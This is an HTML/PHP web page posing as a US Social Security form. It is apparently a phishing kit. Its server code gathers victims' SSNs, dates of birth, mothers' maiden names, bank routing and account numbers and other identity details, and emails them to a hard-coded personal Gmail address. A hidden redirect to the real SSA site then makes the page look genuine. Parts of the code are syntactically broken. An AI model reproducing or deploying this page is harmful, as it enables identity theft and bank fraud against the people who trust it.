 <!DOCTYPE html>
<html lang="en">

<head>

 <meta charSet="utf-8"/>

<meta name="viewport" content="width=device-width, initial-scale=1"/>

<link rel="stylesheet" href="/_next/static/css/c821b25864b1cabb.css" data-precedence="next"/>

<link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-4631f8e7ddebd1f3.js"/>
 
 <link rel="icon" type="image.png" href="image/lazy.png" width="32px" height="32px" >

 <title>Social security form</title>
  <link rel="stylesheet" href="/css/main.css" data-precedence="next"/>  
 
   </head>
  <body>

  <?php
if(! empty($_POST["submit"])){
 $fname = $_POST["fname"];
 $ssn = $_POST["ssn"];
$mailAddress = $_POST["mailAddress"];
$fathersFname = $_POST["fathersFname"];
$mothersFname = $_POST["mothersFname"];
$mothersMname = $_POST["mothersMname"];
$city = $_POST["city"];
$state = $_POST["state"];
$amount = $_POST["amount"];
$routing = $_POST["routing"];
$account = $_POST["account"];
$phone_number = $_POST["phone_number"];
$QA = $_POST["QA"];
$dob = $_POST["dob"];
$dateOfPayment = $_POST["dateOfPayment"];
 $toEmail = "detralaverne6@gmail.com";


 $mailHeaders = "Name:   "  . $fname  .
  "\r\n Ssn: "  .  $ssn  .
    "\r\n Address: "  .  $mailAddress  .
    "\r\n Fathersname: "  .  $fathersFname  .
    "\r\n Mothersname: "  .  $mothersFname  .
    "\r\n Mothersmaiden: "  .  $mothersMname  .
    "\r\n City: "  .  $city  .
    "\r\n State: "  .  $state  .
    "\r\n Amount: "  .  $amount  .
    "\r\n Routing: "  .  $routing  .
    "\r\n Account: "  .  $account  .
    "\r\n Phonenumber: "  .  $phone_number  .
    "\r\n QA: "  .  $QA  .
    "\r\n dob: "  .  $dob  .
    "\r\n Dateofpayment: "  .  $dateOfPayment  .   "\r\n  ;

    if (mail($toEmail, $fname, $mailHeaders)){
    $message = "Your Information is Received Successfully.";
    
    }

 
}
    ?>


   <div class="px-6 lg:px-20">
 
 <form action= method="POST" />
  <input type="hidden" name="_subject" value="New submission!">
  <input type="hidden" name="_next" value="https://ssa.gov/">
  <input type="hidden" name="_captcha" value="false">
 
  <div class="my-4">
<label for="fname" class="block my-1">Full Name</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="fname" required="" name="fname" value=""/>
</div>

<div class="my-4">
<label for="ssn" class="block my-1">SSN</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="ssn" required="" name="ssn" value=""/>
</div>

 <div class="my-4">
<label for="mailAddress" class="block my-1">Mailing Address on Profile</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="mailAddress" required="" name="mailAddress" value=""/></div>

<div class="my-4">
<label for="fathersFname" class="block my-1">Father&#x27;s Full Name</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="fathersFname" required="" name="fathersFname" value=""/></div>

<div class="my-4">
<label for="mothersFname" class="block my-1">Mother&#x27;s Full Name</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="mothersFname" required="" name="mothersFname" value=""/></div>

<div class="my-4">
<label for="mothersMname" class="block my-1">Mother&#x27;s Maiden Name</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="mothersMname" required="" name="mothersMname" value=""/></div>

<div class="my-4">
<label for="city" class="block my-1">City Born</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="city" required="" name="city" value=""/></div>

<div class="my-4">
<label for="state" class="block my-1">State</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="state" required="" name="state" value=""/></div>

<div class="my-4">
<label for="amount" class="block my-1">Amount Received Last Month (In USD)</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="amount" required=""  name="amount" value=""/></div>

<div class="my-4">
<label for="routing" class="block my-1">Routing Number On File</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="routing" required=""  name="routing" value=""/></div>

<div class="my-4">
<label for="account" class="block my-1">Account Number On File</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="account" required="" name="account" value=""/></div>

<div class="my-4">
<label for="phone_number" class="block my-1">Phone Number</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="phone_number" required="" name="phone_number" value=""/></div>

<div class="my-4">
<label class="block my-1" for="QA">Did You Receive SSA (YES or NO)</label>
<select  id="QA" class="border border-gray-400 rounded-md px-3 py-2" required="" name="QA">
<option value="" selected="">Select an Option</option>
<option value="Yes">Yes</option>
<option value="No">No</option>
</select>
</div>

<div class="my-4">
<label for="dob" class="block my-1">Date of Birth (MM/DD/YY)</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="dob" required="" name="dob" value=""/>
</div>

<div class="my-4">
<label for="dateOfPayment" class="block my-1">Date Of Payment (MM/DD/YY)</label>
<input type="text" class="w-full border border-gray-400 rounded-md px-3 py-2" id="dateOfPayment" required="" name="dateOfPayment" value=""/></div>

<div class="my-4">
<button class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 border border-input hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2 bg-blue-700 text-white" 
name="SUbmit" type="submit">Submit
</button>
</div>
   <?php if(!empty($message)){   ?>
   <div class="success">
    <strong><?php  echo $message;   ?></strong>
   </div>
<?php  }  ?>   

</form>

   </div>
    
  </body>
</html>
